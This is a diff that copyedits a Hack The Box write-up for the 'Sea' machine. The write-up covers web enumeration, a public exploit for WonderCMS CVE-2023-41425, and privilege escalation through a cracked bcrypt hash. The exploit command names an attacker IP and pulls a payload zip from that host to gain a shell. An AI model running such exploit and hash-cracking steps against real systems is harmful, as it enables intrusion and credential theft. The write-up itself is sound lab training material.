@@ -37,18 +37,18 @@ Sea is an Easy-rated Linux machine on Hack The Box that requires thorough web en
 {{% /details %}}
 {{< /callout >}}
 
-## Enumeration.
-- **IP:** 10.10.11.28
-- **Environment:** Linux
+## Enumeration
+- * **IP:** 10.10.11.28
+- * **Environment:** Linux
 
-### Port Scan.
-To begin, I conducted an initial enumeration using *nmap*:
+### Port Scan
+To begin, I conducted an initial enumeration using *Nmap*:
 
 ```bash
 sudo nmap -sS -sV -sC -p22,80 -Pn -n -vvv 10.129.109.135 -oA nmap/allPorts
 ```
 
-```java 
+```bash 
 # Nmap 7.94SVN scan initiated Tue Aug 13 14:42:56 2024 as: nmap -sS -sV -sC -p22,80 -Pn -n -vvv -oA nmap/allPorts 10.129.109.135
 Nmap scan report for 10.129.109.135
 Host is up, received user-set (0.12s latency).
@@ -84,7 +84,7 @@ The scan revealed two open ports:
 - **22/tcp** 
 - **80/tcp**
 
-#### Host Discovery.
+#### Host Discovery
 Visiting the web page on port 80 revealed a hostname in a redirect link: `sea.htb`. This was added to `/etc/hosts`:
 
 ![Alt Text](/assets/images/HTB/Sea/sea1.png)
@@ -94,9 +94,9 @@ Visiting the web page on port 80 revealed a hostname in a redirect link: `sea.ht
 ```
 
 
-### Fuzzing the target.
-#### Identifying folders.
-I began fuzzing the web server to identify directories using *ffuf*. After getting results I was able to identify some directories that were giving back status code 301 (forbidden).
+### Fuzzing the target
+#### Identifying folders
+I began fuzzing the web server to identify directories using *ffuf*. After getting results, I was able to identify some directories that were returning a status code of 301 (forbidden).
 
 ```bash
 ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://sea.htb/FUZZ -c -fc 403
@@ -104,18 +104,18 @@ ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -
 
 ![Alt Text](/assets/images/HTB/Sea/sea2.png)
 
-## Foothold.
+## Foothold
 
-### Targeted fuzzing.
+### Targeted fuzzing
 I tried to uncover hidden content by looking for files/folders *within specific folders*. The idea was to fuzz deeper into the directory structure, targeting areas that might not have the same level of protection or redirection rules. By isolating and testing these subdirectories.
-In this case I focused on the **themes** directory:
+In this case, I focused on the **themes** directory:
 
 ```bash
 ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://sea.htb/themes/FUZZ -c
 ```
 ![Alt Text](/assets/images/HTB/Sea/sea3.png)
 
-After reviewing these results the folder *bike*, was the one that caught my attention (eventhough it was giving 301 status). I decided to keep enumetating, fuzzing and digging deeper for more information.
+After reviewing these results, the folder *bike* was the one that caught my attention, even though it was giving a 301 status. I decided to keep enumerating, fuzzing, and digging deeper for more information.
 
 ![Alt Text](/assets/images/HTB/Sea/sea4.png)
 
@@ -126,7 +126,7 @@ Within `/themes/bike/`, I discovered a file called *version*. Accessing it revea
 
 ![Alt Text](/assets/images/HTB/Sea/sea5.png)
 
- Further exploration led to README.md, which provided details about the  software used by the site - **WonderCMS**.
+ Further exploration led to `README.md`, which provided details about the software used by the site: **WonderCMS**.
 
 ![Alt Text](/assets/images/HTB/Sea/sea6.png) 
 
@@ -137,13 +137,13 @@ Researching the identified software version uncovered a critical vulnerability:
 
 - **CVE-2023-41425** - *WonderCMS* Cross-Site Scripting (XSS) leading to Remote Code Execution (RCE)
 
-This vulnerability affects **WonderCMS** versions **3.2.0 through 3.4.2**. The vulnerability lies in the installModule component of WonderCMS, where user inputs are not adequately sanitized before being processed.
+This vulnerability affects **WonderCMS** versions **3.2.0 through 3.4.2**. The vulnerability lies in the `installModule` component of WonderCMS, where user inputs are not adequately sanitized before being processed.
 
-To make the exploit work the attacker should either be authentificated or somehow make an authentificated usr to execute the code. In the case of the machine there ir a bot that triggers this action.
+For the exploit to work, the attacker must either be authenticated or trick an authenticated user into executing the malicious code. In this case, the machine uses a bot that automatically triggers the action.
 
 ## Exploitation
 
-Upon using a python exploit script from [GitHub](https://github.com/insomnia-jacob/CVE-2023-41425),the script required specifying the URL, attacker IP, attacker port, and the path to the payload zip file:
+Using a Python 3 exploit script from [GitHub](https://github.com/insomnia-jacob/CVE-2023-41425), the script required specifying the URL, attacker IP, attacker port, and the path to the payload zip file:
 
 ```bash
 python3 exploit.py -u http://sea.htb/loginURL -i 10.10.14.4 -p 1234 -r http://10.10.14.4/main.zip
@@ -158,8 +158,8 @@ Once the payload was prepared, I used the website's contact form to deliver the 
  
 ## Privilege Escalation (Amay)
 
-### Discovering the hash.
-With a shell as www-data, I enumerated the filesystem and discovered a database file at */var/www/sea/data*, containing a hashed password:
+### Discovering the hash
+With a shell as `www-data`, I enumerated the filesystem and discovered a database file at `/var/www/sea/data`, containing a hashed password:
 
 
 ![Alt Text](/assets/images/HTB/Sea/sea9.png)
@@ -167,8 +167,8 @@ With a shell as www-data, I enumerated the filesystem and discovered a database 
 ```plaintext
 $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
 ```
-### Cracking the hash.
-Using hashcat, I cracked the hash with the following command:
+### Cracking the hash
+Using Hashcat, I cracked the hash with the following command:
 
 ```bash
 hashcat -m 3200 DB.hash /usr/share/wordlists/rockyou.txt --force
@@ -199,7 +199,7 @@ To access it, I established local port forwarding:
 ssh -D 8080  amay@10.129.109.135
 ```
 
-Navigating to http://localhost:8080, I found a dashboard requiring credentials. The credentials for amay worked, granting access to the dashboard.
+Navigating to http://localhost:8080, I found a dashboard requiring credentials. The credentials for `amay` worked, granting access to the dashboard.
 
 ![Alt Text](/assets/images/HTB/Sea/sea12.png)
 
